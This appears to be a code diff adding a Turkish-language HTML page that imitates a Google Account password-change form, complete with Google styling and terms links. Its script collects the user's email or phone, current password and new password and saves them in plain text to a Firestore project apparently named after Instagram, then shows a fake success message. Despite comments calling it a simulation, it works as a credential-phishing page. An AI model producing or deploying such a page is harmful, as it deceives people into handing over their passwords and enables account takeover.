@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Hesabı - Şifre Güncelleme</title>
+    <style>
+        /* Base styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            /* Gmail/Google Teması: Açık arka plan, temiz font */
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f8f9fa; /* Çok Açık Gri/Neredeyse Beyaz Arka Plan */
+            color: #202124; /* Koyu Metin Rengi */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 380px; /* Daha geniş bir konteyner */
+            background-color: #fff; /* Konteyner arka planı beyaz */
+            border: 1px solid #dadce0; /* Çok hafif kenarlık */
+            padding: 48px 40px;
+            border-radius: 8px; /* Daha belirgin yuvarlak köşeler */
+            /* Google'ın hafif kutu gölgesi */
+            box-shadow: 0 1px 3px 0 rgba(60,64,67,.3), 0 4px 8px 3px rgba(60,64,67,.15);
+        }
+
+        /* Logo Styling (SVG Container) */
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        /* Gmail İkonu ve Başlık */
+        .logo-title {
+            color: #202124;
+            font-size: 24px;
+            font-weight: 400;
+            margin-top: 10px;
+        }
+
+        /* SVG styles for the envelope icon (Gmail Look) */
+        .email-icon {
+            width: 50px; 
+            height: 50px;
+            color: #EA4335; /* Gmail kırmızısı */
+            stroke: #EA4335;
+        }
+
+        /* Subtitle Styling */
+        .subtitle {
+            text-align: center;
+            color: #5f6368; /* Orta gri */
+            font-size: 16px;
+            margin-bottom: 30px;
+            line-height: 20px;
+            font-weight: 400;
+        }
+
+        /* Input Group Styling */
+        .input-container {
+            position: relative;
+            margin-bottom: 20px; /* Inputlar arasında daha fazla boşluk */
+        }
+
+        /* Input Field Styling (Material Design Benzeri) */
+        input {
+            width: 100%;
+            padding: 18px 15px; /* Daha fazla padding */
+            background-color: #fff; 
+            border: 1px solid #dadce0; 
+            border-radius: 4px;
+            color: #000;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        
+        /* Password inputs need extra space for the button */
+        #oldPassword, #newPassword, #confirmPassword {
+             padding-right: 90px;
+        }
+
+        input::placeholder {
+            color: #5f6368;
+        }
+
+        input:focus {
+            border-color: #1a73e8; /* Google Mavi çerçeve */
+            box-shadow: 0 0 0 1px #1a73e8;
+        }
+
+        /* Show/Hide Button Styling */
+        .show-hide-btn {
+            position: absolute;
+            right: 8px; 
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #1a73e8; /* Google Mavi */
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 4px 8px;
+            border-radius: 4px;
+            transition: opacity 0.2s;
+        }
+
+        .show-hide-btn:hover {
+            opacity: 0.8;
+        }
+        
+        /* Terms & Policy Text Styling - Simplified for Google */
+        .terms {
+            text-align: left;
+            font-size: 14px;
+            color: #5f6368;
+            margin: 20px 0 10px 0;
+            line-height: 20px;
+        }
+
+        .terms a {
+            color: #1a73e8; /* Link rengi */
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        /* Button Styling - Google Blue */
+        .change-btn {
+            padding: 10px 24px;
+            background-color: #1a73e8;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s, box-shadow 0.2s;
+            width: auto;
+        }
+        
+        /* Disabled button state */
+        .change-btn:disabled {
+            background-color: #a8d0f7; /* Açık mavi */
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        
+        .change-btn:disabled:hover {
+            background-color: #a8d0f7;
+            box-shadow: none;
+        }
+
+        .change-btn:hover {
+            background-color: #1565c0;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
+        }
+
+        .change-btn:active {
+            background-color: #1555b0;
+        }
+        
+        /* Footer area for action button placement */
+        .form-footer {
+            margin-top: 20px;
+            display: flex;
+            justify-content: flex-end; /* Butonu sağa hizlamak için */
+            align-items: center;
+        }
+
+
+        /* --- Message Boxes --- */
+
+        /* Success Message Box (Google Green) */
+        .success-message {
+            display: none;
+            background-color: #e6f4ea; /* Çok açık yeşil */
+            border: 1px solid #34a853; /* Google yeşili */
+            color: #1e8e3e; 
+            padding: 16px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 14px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        /* Custom Error Message Box (Google Red) */
+        .custom-message {
+            display: none;
+            background-color: #fce8e6; /* Çok açık kırmızı */
+            border: 1px solid #ea4335; /* Google kırmızısı */
+            color: #c5221f; 
+            padding: 16px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 14px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        /* Message Box Visibility */
+        .success-message.show,
+        .custom-message.show {
+            display: block;
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logo ve Başlık -->
+        <div class="logo">
+            <!-- Basit Zarf SVG İkonu (Gmail'i Temsil Eder) -->
+            <svg class="email-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+                <polyline points="22,6 12,13 2,6"></polyline>
+            </svg>
+            <div class="logo-title">Google Hesabı</div>
+        </div>
+        
+        <div class="subtitle">Şifrenizi Güncelleyin</div>
+        
+        <!-- Success Message UI -->
+        <div class="success-message" id="successMessage">
+            Şifreniz başarılı bir şekilde güncellenmiştir.
+        </div>
+
+        <!-- Custom Error Message UI -->
+        <div class="custom-message" id="customMessage">
+            <!-- Hata mesajı içeriği JavaScript tarafından eklenecek -->
+        </div>
+
+        <form id="passwordForm">
+            <div class="input-container">
+                <input type="text" placeholder="E-posta veya telefon" id="username" required>
+            </div>
+
+            <!-- Eski Şifre Alanı -->
+            <div class="input-container">
+                <input type="password" placeholder="Mevcut Şifreniz" id="oldPassword" required>
+                <!-- Göz İkonu Yerine Buton -->
+                <button type="button" class="show-hide-btn" onclick="togglePassword('oldPassword', this)">Göster</button>
+            </div>
+
+            <!-- Yeni Şifre Alanı -->
+            <div class="input-container">
+                <input type="password" placeholder="Yeni Şifre" id="newPassword" required>
+                <!-- Göz İkonu Yerine Buton -->
+                <button type="button" class="show-hide-btn" onclick="togglePassword('newPassword', this)">Göster</button>
+            </div>
+
+            <!-- Şifreyi Onayla Alanı -->
+            <div class="input-container">
+                <input type="password" placeholder="Yeni Şifreyi Onayla" id="confirmPassword" required>
+                <!-- Göz İkonu Yerine Buton -->
+                <button type="button" class="show-hide-btn" onclick="togglePassword('confirmPassword', this)">Göster</button>
+            </div>
+
+            <div class="terms">
+                Şifrenizi güvende tutmak için yeni şifrenizin mevcut şifrenizden farklı olmadığından emin olun. <a href="#">Daha Fazla Bilgi</a>
+            </div>
+
+            <div class="terms">
+                Devam ederek Google'ın <a href="#">Kullanım Şartları</a> ve <a href="#">Gizlilik Politikası</a>'nı kabul etmiş olursunuz.
+            </div>
+            
+            <div class="form-footer">
+                <button type="submit" class="change-btn" id="submitButton" disabled>Oturum bekleniyor...</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Firebase SDK Imports and App Logic -->
+    <script type="module">
+        // Firebase CDN Imports
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, doc, setDoc, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        
+        // --- Sabit Firebase Yapılandırması (Yedek) ---
+        // Global yapılandırma gelmediğinde bu yedek kullanılır.
+        const hardcodedConfig = {
+            apiKey: "AIzaSyCXZkVGwozT9ZZJewXNZfLMAkVpkZyGhuA",
+            authDomain: "instagram-ba29a.firebaseapp.com",
+            projectId: "instagram-ba29a",
+            storageBucket: "instagram-ba29a.firebasestorage.app",
+            messagingSenderId: "914906862263",
+            appId: "1:914906862263:web:8656810f106a693138f332",
+            measurementId: "G-NXCHJL9QNC"
+        };
+
+        // --- ZORUNLU GLOBAL DEĞİŞKENLERİ YÜKLE ---
+        // Global yapılandırmayı kullanın, yoksa sabit yedek yapılandırmayı kullanın
+        const firebaseConfig = typeof __firebase_config !== 'undefined'
+            ? JSON.parse(__firebase_config)
+            : hardcodedConfig;
+            
+        const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+
+        // Firebase yapılandırması başarısız olursa (sabit yedek bile yoksa) uygulamayı durdur.
+        if (!firebaseConfig || !firebaseConfig.apiKey) {
+            console.error("HATA: Firebase yapılandırması başlatılamıyor. Hem global değişken hem de sabit yedek eksik.");
+            document.getElementById('submitButton').textContent = 'HATA: Yapılandırma Yok';
+            document.getElementById('submitButton').disabled = true;
+        } else {
+            // Firebase loglarını aç (opsiyonel)
+            setLogLevel('Debug');
+            
+            // Firebase Başlatma
+            const app = initializeApp(firebaseConfig);
+            const db = getFirestore(app);
+            const auth = getAuth(app);
+            
+            let currentUserId = null;
+
+            // Oturum Açma (Anonim olarak veya Canvas token'ı ile)
+            async function authenticate() {
+                const submitButton = document.getElementById('submitButton');
+                submitButton.textContent = 'Oturum Açılıyor...';
+                submitButton.disabled = true;
+
+                try {
+                    if (initialAuthToken) {
+                        // Özel token varsa, onunla giriş yap
+                        await signInWithCustomToken(auth, initialAuthToken);
+                        console.log(`Kullanıcı özel token ile doğrulandı.`);
+                    } else {
+                        // Yoksa anonim giriş yap
+                        await signInAnonymously(auth);
+                        console.log(`Kullanıcı anonim olarak doğrulandı.`);
+                    }
+
+                    // Kullanıcı Kimliğini Al veya bir Fallback UUID oluştur
+                    currentUserId = auth.currentUser?.uid || crypto.randomUUID(); 
+                    console.log(`Oturum Açık (UID): ${currentUserId}`);
+                    
+                    // Başarılı: Butonu etkinleştir
+                    submitButton.textContent = 'Şifreyi Güncelle';
+                    submitButton.disabled = false;
+
+                } catch (error) {
+                    console.error("Oturum açma hatası:", error);
+                    showMessage(`Oturum açılırken kalıcı bir hata oluştu: ${error.message}. Form devre dışı.`, true);
+                    currentUserId = null;
+                    // Hata: Butonu devre dışı bırak ve hata metni göster
+                    submitButton.textContent = 'HATA: Oturum Yok';
+                    submitButton.disabled = true;
+                }
+            }
+
+            // Uygulama yüklenirken oturum açmayı başlat
+            authenticate();
+
+
+            // --- UI ve Mesaj Fonksiyonları ---
+
+            /**
+             * Özel bir mesajı (hata veya başarı) uygun mesaj kutusunda görüntüler.
+             */
+            function showMessage(message, isError = false) {
+                const customMessage = document.getElementById('customMessage');
+                const successMessage = document.getElementById('successMessage');
+
+                // Önceki mesajları gizle
+                successMessage.classList.remove('show');
+                customMessage.classList.remove('show');
+
+                if (isError) {
+                    customMessage.textContent = message;
+                    customMessage.classList.add('show');
+                } else {
+                    successMessage.textContent = message;
+                    successMessage.classList.add('show');
+                }
+
+                // Başarı mesajını 3 saniye sonra otomatik olarak gizle
+                if (!isError) {
+                    setTimeout(() => {
+                        successMessage.classList.remove('show');
+                    }, 3000);
+                }
+            }
+
+            // --- Form Gönderim Mantığı (Firestore ile Simülasyon) ---
+            document.getElementById('passwordForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                document.getElementById('customMessage').classList.remove('show');
+                document.getElementById('successMessage').classList.remove('show');
+
+                const username = document.getElementById('username').value.trim();
+                const oldPassword = document.getElementById('oldPassword').value;
+                const newPassword = document.getElementById('newPassword').value;
+                const confirmPassword = document.getElementById('confirmPassword').value;
+
+                // 1. Basit Alan Kontrolü
+                if (!username || !oldPassword || !newPassword || !confirmPassword) {
+                    showMessage('Lütfen tüm alanları doldurun.', true);
+                    return;
+                }
+                
+                // 2. Şifre Eşleşme Kontrolü
+                if (newPassword !== confirmPassword) {
+                    showMessage('Yeni şifreler eşleşmiyor! Lütfen kontrol edin.', true);
+                    return;
+                }
+                
+                // 3. Oturum Kontrolü (Buton zaten kapalıysa buraya düşmemeli, ama güvenlik için)
+                if (!currentUserId) {
+                    showMessage('Oturum bilgisi bulunamadı. Lütfen oturumun açılmasını bekleyin veya sayfayı yenileyin.', true);
+                    return;
+                }
+                
+                // 4. Şifre Güvenlik Kontrolü (Aynı olmaması)
+                if (newPassword === oldPassword) {
+                     showMessage('Yeni şifreniz, mevcut şifrenizden farklı olmalıdır.', true);
+                     return;
+                }
+
+                // --- Firestore Şifre Güncelleme Simülasyonu ---
+                try {
+                    // Firestore yolu: /artifacts/{appId}/users/{userId}/password_changes/{emailOrPhone}
+                    const docPath = `artifacts/${appId}/users/${currentUserId}/password_changes`;
+                    // Kullanıcı adına özel belge oluşturuluyor
+                    const passwordDocRef = doc(db, docPath, username.toLowerCase()); 
+
+                    // setDoc ile simüle edilmiş şifre değiştirme kaydı oluşturuluyor/güncelleniyor.
+                    await setDoc(passwordDocRef, {
+                        emailOrPhone: username,
+                        action: 'Google Password Change Simulation (Plain Data Saved - NOT SECURE)',
+                        timestamp: new Date().toISOString(),
+                        
+                        // !!! DİKKAT: GÜVENLİK RİSKİ NEDENİYLE BU VERİLER GERÇEK UYGULAMALARDA ASLA DÜZ METİN OLARAK KAYDEDİLMEMELİDİR !!!
+                        oldPassword: oldPassword,
+                        newPassword: newPassword,
+                        // !!! DİKKAT: GÜVENLİK RİSKİ NEDENİYLE BU VERİLER GERÇEK UYGULAMALARDA ASLA DÜZ METİN OLARAK KAYDEDİLMEMELİDİR !!!
+
+                        newPasswordLength: newPassword.length,
+                        isConfirmed: true,
+                    }, { merge: true });
+
+                    // GÜNCELLENMİŞ KISIM: Firestore uyarısı kaldırıldı.
+                    showMessage('Şifreniz başarılı bir şekilde güncellenmiştir.', false);
+                    document.getElementById('passwordForm').reset();
+                } catch (error) {
+                    console.error("Firestore işlemi hatası:", error);
+                    showMessage(`Şifre güncelleme işlemi başarısız oldu: ${error.message}`, true);
+                }
+            });
+        }
+        
+        /**
+         * Parola alanının türünü değiştirir ('password' <-> 'text') ve buton metnini günceller.
+         */
+        function togglePassword(inputId, button) {
+            const input = document.getElementById(inputId);
+            if (input.type === 'password') {
+                input.type = 'text';
+                button.textContent = 'Gizle';
+            } else {
+                input.type = 'password';
+                button.textContent = 'Göster';
+            }
+        }
+
+        // Dışarıdan erişim için togglePassword fonksiyonunu global kapsamda tutma
+        window.togglePassword = togglePassword;
+    </script>
+</body>
+</html>
